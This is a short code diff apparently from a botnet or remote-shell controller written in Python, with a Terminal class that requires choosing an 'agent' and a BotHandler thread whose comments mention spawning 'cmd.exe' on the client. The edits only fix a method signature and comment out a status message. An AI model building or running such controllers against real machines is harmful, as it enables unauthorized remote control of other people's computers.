@@ -158,7 +158,7 @@ class Terminal(Cmd):
         self.q = None
         self.prompt = '$ '
     
-    def do_shell(self):
+    def do_shell(self,args):
         if self.q == None:
             print("[-] You need to choose agent.")
             self.help_interact()
@@ -213,8 +213,9 @@ class BotHandler(threading.Thread):
         
         # Initial message for socket state check on client side.
         # If socket ok, will credate 'cmd.exe' subprocess.
-        self.client.send("background checks..".encode("utf-8"))
-        
+        # self.client.send("background checks..".encode("utf-8"))
+        # Not actual in agent client.
+
         # Getting banner
         banner = ""
         while True:
